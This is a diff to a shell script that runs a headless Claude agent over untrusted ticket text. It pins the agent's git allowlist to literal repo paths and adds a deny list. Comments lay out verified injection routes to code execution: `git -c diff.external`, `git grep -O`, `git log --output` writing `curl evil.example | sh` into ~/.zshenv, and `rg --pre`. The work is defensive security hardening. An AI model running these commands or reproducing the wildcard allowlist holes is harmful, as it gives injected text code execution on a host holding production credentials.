@@ -29,8 +29,12 @@
 # treated as empty (never crashes).
 #
 # === SAFETY: read-only + shadow-first ======================================
-#   * Makes NO writes to ClickUp / repos / cluster. Sources are read-only and
-#     the claude pass is launched with --permission-mode plan.
+#   * Makes NO writes to ClickUp / repos / cluster. NOTE: the claude pass is NOT
+#     run under `--permission-mode plan` (that would block execution and make the
+#     model reason from the title alone — the failure mode this design kills, see
+#     the invocation below). Its only boundary is DRAFTER_ALLOWED_TOOLS +
+#     DRAFTER_DENIED_TOOLS, so every allowlisted verb AUTO-EXECUTES over untrusted
+#     ticket text. Treat that allowlist as a security control, not a convenience.
 #   * Dispatches NOTHING. It only produces a queue + (optionally) a clawgate notice.
 #   * Default mode is SHADOW: write the queue to a file and LOG "would send",
 #     send nothing live, until you flip DRAFTER_MODE=on.
@@ -254,8 +258,95 @@ export REPO_COS_PROD_KUBECONFIG="${REPO_COS_PROD_KUBECONFIG:-$HOME/workspace/hom
 #    inject flags into git THROUGH it: the wrapper validates the (untrusted) ticket
 #    id + terms and controls exactly what git runs. This is the safe boundary the
 #    audit called for; prefer it over hand-rolled git in the prompt.
+#
+# ⛔⛔ RCE CLASS: `git -C * <verb>*` ADMITTED GLOBAL OPTIONS — the `-C` path is now
+#    PINNED to literal absolute repo paths (2026-07-28). This was live from
+#    2026-06-23 until this commit; it is NOT something PR #177 introduced.
+#
+#    The hole. A `*` compiles to `.*` in an ANCHORED, whitespace-normalised,
+#    DOTALL regex, so `Bash(git -C * log*)` does not mean "one path token" — it
+#    means "anything at all between `-C ` and ` log`". git's GLOBAL options
+#    (`-c <k>=<v>`, `--exec-path=`, `--namespace=`, …) must be written BEFORE the
+#    subcommand, i.e. in exactly that slot. So the wildcard handed an injected
+#    ticket the ability to set ARBITRARY GIT CONFIG on a read verb, and several
+#    config keys are "run this command":
+#
+#      git -C <repo> -c diff.external='sh -c "id > /tmp/MARKER" --' log -p --ext-diff
+#
+#    REPRODUCED BY EXECUTION on a scratch repo (git 2.54.0): the marker was
+#    written and contained `uid=1000(zach) … groups=…,docker` — i.e. arbitrary
+#    code as the drafter's own user, who is in the `docker` group (root
+#    equivalent) and whose environment carries the PRODUCTION kubeconfig. It
+#    needs no tty, so headless does not protect it; `diff.external`,
+#    `core.fsmonitor` and `alias.<x>=!<cmd>` were each verified to execute.
+#    It carries no `$VAR`/`&&`/`;`/`|`/`$()`/redirect, so the prompt's
+#    COMMAND-SHAPE guard and the bash-guard hook both pass it through.
+#
+#    Why PINNING closes it, structurally (verified, not assumed). git accepts
+#    `-c`/`--exec-path` ONLY before the subcommand — verified by execution:
+#    `git -C R log -c diff.external=id …` → rc=128 "ambiguous argument", and
+#    `git -C R log --exec-path=/tmp` → rc=128 "unrecognized argument" (same for
+#    `show`/`diff`/`rev-parse`). Pinning makes `git -C <LITERAL PATH> <verb>` a
+#    STRICT PREFIX with the verb IMMEDIATELY after the path, so there is no slot
+#    left to insert them into: an attacker can only append AFTER the verb, where
+#    git rejects them. `git --exec-path=… -C <path> log` cannot match either —
+#    the pattern is anchored at `git -C `.
+#    Only the three repos the drafter actually reads are pinned (measured across
+#    all 81 historical transcripts: civitai 782 calls, datapacket-talos 16,
+#    homelab-talos 4). Cost is zero: drafter-prompt.md already orders the model
+#    to paste the literal absolute path and forbids `$CIVITAI`.
+#    ⛔ NEVER re-introduce `Bash(git -C * …)`. A new repo gets a new PINNED
+#    triplet of entries, never a wildcard. Tests guard this.
+#    ⚠ If you override $CIVITAI_REPO/repo paths by env, you MUST add matching
+#    pinned entries or every git read is silently rejected in headless.
+#
+# ⛔ `git -C * grep*` was REMOVED in the same pass — pinning does NOT close it.
+#    `git grep -O<cmd>` / `--open-files-in-pager=<cmd>` runs <cmd>, and that flag
+#    sits AFTER the subcommand, i.e. inside the trailing `*` that any prefix
+#    pattern must leave open. VERIFIED BY EXECUTION (git 2.54.0): both spellings
+#    executed with stdout redirected to /dev/null (no tty needed), and `git grep`
+#    uses parse-options so even the ABBREVIATED `--open=<cmd>` executes — a
+#    substring filter cannot catch it either. Same verdict as `ls-remote`: a
+#    prefix glob CANNOT forbid the exec flag, so DROP the verb, don't narrow it.
+#    Replacement, no capability lost: the native `Grep` tool (already granted)
+#    for working-tree search, and `git -C <pinned> log --grep/-S` for history.
+#
+# 🛡 DEFENCE IN DEPTH: DRAFTER_DENIED_TOOLS (`--disallowedTools`). Pinning closes
+#    the PRE-subcommand slot; it cannot close POST-subcommand flags. One proven
+#    residual remains on the read verbs we must keep:
+#      git -C <pinned> log --output=/home/zach/.zshenv --pretty=format:'<any text>' -1
+#    `--output=<file>` (a diff option, live on log/show/diff/rev-list) writes to
+#    an ARBITRARY path, TRUNCATING it, and `--pretty=format:` makes the CONTENT
+#    fully attacker-chosen — VERIFIED BY EXECUTION (wrote `curl evil.example | sh`
+#    to a chosen file, and clobbered a pre-existing file). Dropped into `~/.zshenv`
+#    that is a full RCE on the next shell. Separately, the pre-existing
+#    `Bash(rg*)` entry admits `rg --pre <program>` / `--hostname-bin <program>`,
+#    which EXECUTE that program (verified).
+#    A prefix ALLOW pattern cannot forbid a suffix, so these are closed with a
+#    DENY layer instead. Verified by execution against the real CLI that (a)
+#    `--disallowedTools` OVERRIDES `--allowedTools`, (b) leading/mid `*` works in
+#    a deny pattern, and (c) a deny pattern CONTAINING SPACES survives the CLI's
+#    comma/space arg parsing — control run without the deny rule executed the
+#    same command. Also verified that `--output`/`--pre`/`--hostname-bin` accept
+#    NO abbreviation (`--outp=`, `--pr` → rc≠0), so a substring deny is sound
+#    here (unlike `git grep --open`, which is why that verb was dropped instead).
+#    This is belt-and-braces, NOT the structural fix: a deny list is enumeration,
+#    so the durable answer is to move raw git behind a fixed wrapper in the style
+#    of `ticket-status` (which the model already prefers). Tests assert every
+#    prompt-mandated shape survives the deny layer.
 # Override DRAFTER_ALLOWED_TOOLS via env ONLY with read-only verbs.
-DRAFTER_ALLOWED_TOOLS="${DRAFTER_ALLOWED_TOOLS:-Read,Glob,Grep,WebFetch,Bash($SELF_DIR/ticket-status*),Bash(node *query.mjs get*),Bash(node *query.mjs comments*),Bash(node *query.mjs search*),Bash(git -C * log*),Bash(git -C * show*),Bash(git -C * diff*),Bash(git -C * grep*),Bash(git -C * branch --contains*),Bash(git -C * branch --merged*),Bash(git -C * branch -a),Bash(git -C * branch --all),Bash(git -C * rev-parse*),Bash(git -C * rev-list*),Bash(git -C * merge-base*),Bash(git -C * for-each-ref*),Bash(git -C * symbolic-ref --short*),Bash(git -C * ls-files*),Bash(git -C * cat-file*),Bash(git log*),Bash(gh pr list*),Bash(gh pr view*),Bash(gh pr checks*),Bash(gh -R civitai/civitai pr list*),Bash(gh -R civitai/civitai pr view*),Bash(gh -R civitai/civitai pr checks*),Bash(gh -R civitai/talos-infra pr list*),Bash(gh -R civitai/talos-infra pr view*),Bash(gh -R civitai/talos-infra pr checks*),Bash(gh search*),Bash(kubectl get*),Bash(kubectl logs*),Bash(kubectl describe*),Bash(kubectl top*),Bash(grep*),Bash(rg*),Bash(jq*),Bash(cat*),Bash(echo*),Bash(date*)}"
+DRAFTER_ALLOWED_TOOLS="${DRAFTER_ALLOWED_TOOLS:-Read,Glob,Grep,WebFetch,Bash($SELF_DIR/ticket-status*),Bash(node *query.mjs get*),Bash(node *query.mjs comments*),Bash(node *query.mjs search*),Bash(git -C /home/zach/workspace/civit/civitai log*),Bash(git -C /home/zach/workspace/civit/civitai show*),Bash(git -C /home/zach/workspace/civit/civitai diff*),Bash(git -C /home/zach/workspace/civit/civitai branch --contains*),Bash(git -C /home/zach/workspace/civit/civitai branch --merged*),Bash(git -C /home/zach/workspace/civit/civitai branch -a),Bash(git -C /home/zach/workspace/civit/civitai branch --all),Bash(git -C /home/zach/workspace/civit/civitai rev-parse*),Bash(git -C /home/zach/workspace/civit/civitai rev-list*),Bash(git -C /home/zach/workspace/civit/civitai merge-base*),Bash(git -C /home/zach/workspace/civit/civitai for-each-ref*),Bash(git -C /home/zach/workspace/civit/civitai symbolic-ref --short*),Bash(git -C /home/zach/workspace/civit/civitai ls-files*),Bash(git -C /home/zach/workspace/civit/civitai cat-file*),Bash(git -C /home/zach/workspace/civit/datapacket-talos log*),Bash(git -C /home/zach/workspace/civit/datapacket-talos show*),Bash(git -C /home/zach/workspace/civit/datapacket-talos diff*),Bash(git -C /home/zach/workspace/civit/datapacket-talos branch --contains*),Bash(git -C /home/zach/workspace/civit/datapacket-talos branch --merged*),Bash(git -C /home/zach/workspace/civit/datapacket-talos branch -a),Bash(git -C /home/zach/workspace/civit/datapacket-talos branch --all),Bash(git -C /home/zach/workspace/civit/datapacket-talos rev-parse*),Bash(git -C /home/zach/workspace/civit/datapacket-talos rev-list*),Bash(git -C /home/zach/workspace/civit/datapacket-talos merge-base*),Bash(git -C /home/zach/workspace/civit/datapacket-talos for-each-ref*),Bash(git -C /home/zach/workspace/civit/datapacket-talos symbolic-ref --short*),Bash(git -C /home/zach/workspace/civit/datapacket-talos ls-files*),Bash(git -C /home/zach/workspace/civit/datapacket-talos cat-file*),Bash(git -C /home/zach/workspace/homelab-talos log*),Bash(git -C /home/zach/workspace/homelab-talos show*),Bash(git -C /home/zach/workspace/homelab-talos diff*),Bash(git -C /home/zach/workspace/homelab-talos branch --contains*),Bash(git -C /home/zach/workspace/homelab-talos branch --merged*),Bash(git -C /home/zach/workspace/homelab-talos branch -a),Bash(git -C /home/zach/workspace/homelab-talos branch --all),Bash(git -C /home/zach/workspace/homelab-talos rev-parse*),Bash(git -C /home/zach/workspace/homelab-talos rev-list*),Bash(git -C /home/zach/workspace/homelab-talos merge-base*),Bash(git -C /home/zach/workspace/homelab-talos for-each-ref*),Bash(git -C /home/zach/workspace/homelab-talos symbolic-ref --short*),Bash(git -C /home/zach/workspace/homelab-talos ls-files*),Bash(git -C /home/zach/workspace/homelab-talos cat-file*),Bash(git log*),Bash(gh pr list*),Bash(gh pr view*),Bash(gh pr checks*),Bash(gh -R civitai/civitai pr list*),Bash(gh -R civitai/civitai pr view*),Bash(gh -R civitai/civitai pr checks*),Bash(gh -R civitai/talos-infra pr list*),Bash(gh -R civitai/talos-infra pr view*),Bash(gh -R civitai/talos-infra pr checks*),Bash(gh search*),Bash(kubectl get*),Bash(kubectl logs*),Bash(kubectl describe*),Bash(kubectl top*),Bash(grep*),Bash(rg*),Bash(jq*),Bash(cat*),Bash(echo*),Bash(date*)}"
+
+# DENY layer (`--disallowedTools`) — see the 🛡 note above. Deny OVERRIDES allow,
+# so this closes the POST-subcommand exec/write flags that a prefix ALLOW pattern
+# structurally cannot forbid. Keep it MINIMAL and tool-scoped: an over-broad deny
+# silently loses reads in headless (the failure mode PR #177 existed to fix).
+#   git -c / --exec-path : belt-and-braces; pinning already removes the slot.
+#   git * --output       : arbitrary-path, arbitrary-content file WRITE (proven RCE
+#                          via ~/.zshenv) on log/show/diff/rev-list. No abbrev.
+#   rg --pre / --hostname-bin : execute an arbitrary program. No abbrev.
+# Set DRAFTER_DENIED_TOOLS="" to disable the layer entirely (not recommended).
+DRAFTER_DENIED_TOOLS="${DRAFTER_DENIED_TOOLS-Bash(git -c *),Bash(git --exec-path*),Bash(git * --output*),Bash(git * --open*),Bash(rg --pre*),Bash(rg * --pre*),Bash(rg --hostname-bin*),Bash(rg * --hostname-bin*)}"
 
 mkdir -p "$DRAFTER_OUT_DIR" 2>/dev/null || true
 # The delta-state file may live outside OUT_DIR (e.g. ~/.local/state/...); make
@@ -486,16 +577,21 @@ Run the five-step pipeline on ticket $TID now and output ONLY the json block."
   # failure mode this design exists to kill). So we grant a TIGHT allowlist of
   # read-only commands via --allowedTools instead of bypassing permissions. The
   # prompt's HARD CONSTRAINTS forbid writes; this allowlist enforces it too (no
-  # apply/edit/delete/commit/push/comment verbs are listed).
+  # apply/edit/delete/commit/push/comment verbs are listed). $DRAFTER_DENIED_TOOLS
+  # is layered on top via --disallowedTools (deny overrides allow) to forbid the
+  # POST-subcommand exec/write flags that a prefix ALLOW pattern cannot express.
   #
   # NB: </dev/null so the headless claude never reads the loop's stdin (the
   # ticket list); without it, claude consumes the rest of the queue and the loop
   # exits after one iteration.
+  DENY_ARGS=()
+  [ -n "$DRAFTER_DENIED_TOOLS" ] && DENY_ARGS=(--disallowedTools "$DRAFTER_DENIED_TOOLS")
   RAW="$(timeout "$DRAFTER_TIMEOUT" \
     env KUBECONFIG="$PROD_KUBECONFIG" \
     claude -p "$PROMPT" \
       --model "$DRAFTER_MODEL" \
       --allowedTools "$DRAFTER_ALLOWED_TOOLS" \
+      ${DENY_ARGS[@]+"${DENY_ARGS[@]}"} \
       </dev/null 2>>"$DRAFTER_LOG_FILE")"
   RC=$?
   if [ $RC -ne 0 ]; then
